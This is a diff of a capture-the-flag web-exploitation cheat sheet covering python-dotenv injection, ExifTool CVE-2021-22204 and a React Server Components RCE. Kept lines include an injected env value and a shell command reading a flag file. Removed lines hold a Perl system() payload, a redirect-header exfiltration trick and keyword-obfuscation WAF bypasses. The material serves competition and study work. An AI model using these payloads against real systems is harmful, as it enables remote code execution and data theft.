@@ -125,7 +125,7 @@ s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")
 ## Python python-dotenv Injection
 
 Escape sequences and newlines in values:
-```
+```text
 backup_server=x\'\nEVIL_VAR=malicious_value\n\'
 ```
 Chain with `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER=/bin/sh -c "cat /flag" %s` for RCE.
@@ -166,11 +166,9 @@ See [server-side.md](server-side.md) for full details.
 
 ## CVE-2021-22204: ExifTool DjVu Perl Injection
 
-**Affected:** ExifTool ≤ 12.23
+**Affected:** ExifTool ≤ 12.23. DjVu ANTa annotation chunk parsed with Perl `eval`. Craft minimal DjVu with injected metadata to achieve RCE on any endpoint processing images with ExifTool.
 
-DjVu ANTa annotation chunk parsed with Perl `eval`. Craft minimal DjVu with `AT&T` header → `FORM` → `DJVU` → `INFO` (1x1) → `ANTa` with `(metadata "\\c${system('cmd')}")`.
-
-See [server-side.md](server-side.md) for full exploit code and DjVu generator.
+See [server-side-advanced.md](server-side-advanced.md#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026) for full exploit code.
 
 ---
 
@@ -225,41 +223,9 @@ pdfdetach -save 1 -o flag.txt output.pdf  # Extract
 
 ## CVE-2025-55182: React Server Components Flight Protocol RCE
 
-**Affected:** React Server Components / Next.js (Flight protocol deserialization)
+**Affected:** React Server Components / Next.js (Flight protocol deserialization). A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary server-side JavaScript execution. Identify via `Next-Action` + `Accept: text/x-component` headers.
 
-**Vulnerability:** The React Flight protocol serializes complex objects from client to server. A crafted fake Flight chunk object is interpreted as a Promise-like structure, and the constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.
-
-**Identification — RSC headers in HTTP requests:**
-```http
-Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
-Accept: text/x-component
-Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A...%5D
-Content-Type: multipart/form-data; boundary=----x
-```
-The `Next-Action` hash maps to a server function name (e.g., `greetUser`). Confirm via `createServerReference()` in client JS bundles.
-
-**Exploitation:** Craft a fake Flight chunk in the multipart body that abuses the constructor chain for code execution. Exfiltrate output via `NEXT_REDIRECT` error thrown into the `x-action-redirect` response header:
-
-```javascript
-throw Object.assign(new Error('NEXT_REDIRECT'), {
-  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
-});
-```
-
-The server responds with `x-action-redirect: /login?a=<exfiltrated_data>;push`.
-
-**WAF bypass:** When keywords like `child_process`, `execSync`, `mainModule` are blocked:
-```javascript
-// String concatenation
-p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
-// Hex encoding
-'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
-'\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
-```
-
-**Detection:** `Accept: text/x-component` header, `Next-Action` header, `createServerReference()` in client JS. Next.js apps using Server Actions with user-controlled form data.
-
-See [server-side.md](server-side.md#react-server-components-flight-protocol-rce-ehax-2026) for full exploitation chain including post-RCE enumeration and lateral movement.
+See [server-side-advanced.md](server-side-advanced.md#react-server-components-flight-protocol-rce-ehax-2026) for full exploit chain.
 
 ---
 
